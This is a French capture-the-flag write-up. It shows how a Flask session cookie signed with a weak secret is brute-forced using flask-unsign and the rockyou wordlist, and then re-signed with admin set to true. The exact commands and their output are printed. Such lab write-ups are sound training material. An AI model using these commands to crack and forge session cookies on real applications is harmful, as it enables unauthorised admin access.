
*Énoncé* : "Le développeur web de la société Flask-me vous affirme qu’utiliser une clé secrète robuste est inutile. Prouvez-lui le contraire !"


Un cookie de session contient un JWT.

On le décode sur jwt.io et on se rend compte que :
- Le format n'est pas traditionnel :
	- Le JSON de données est dans le header au lieu d'être dans la payload
	- Donc le header ne contient pas le nom de l'algorithme utilisé, etc
	- De plus la payload contient des caractères aléatoires qui varient si on régénère le cookie (et n'est pas format JSON)
- Les données contenues dans le header du JWT sont : `{"admin": "false",  "username": "guest"}`
- La signature est courte (27 caractère en base64), soit 40 caractères en hexadécimal, ce qui fait penser à un algo **HMAC-SHA1**

**ATTENTION** : en réalité il ne s'agit pas d'un JWT mais d'un jeton de session créé par Flask. 

*Objectif* : modifier le header pour mettre admin à True, puis truquer le JWT pour avoir une signature valide (par exemple en trouver le secret puis en recréant une signature)

*Idée* : comme le secret est faible et on connait le texte en clair et la signature, on peut tenter un bruteforce. 


On télécharge un outil dédié pour ça (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
```bash
> pip3 install flask-unsign

> flask-unsign --decode --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Zzn0-A.HZjclWuk3D-xhk6rkAgDn-PJTmQ'
{'admin': 'false', 'username': 'guest'}

# BRUTE FORCE
> flask-unsign --wordlist ../Bureau/wordlists/rockyou.txt --unsign --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Zzn0-A.HZjclWuk3D-xhk6rkAgDn-PJTmQ' --no-literal-eval
b's3cr3t'

> flask-unsign --sign --cookie "{'admin': 'true', 'username': 'guest'}" --secret 's3cr3t'
eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Zzn6uw.DF8XNtdeYMzjI_KqTPNERz2yPXw
```
Et on obtient un cookie admin et on récupère le flag !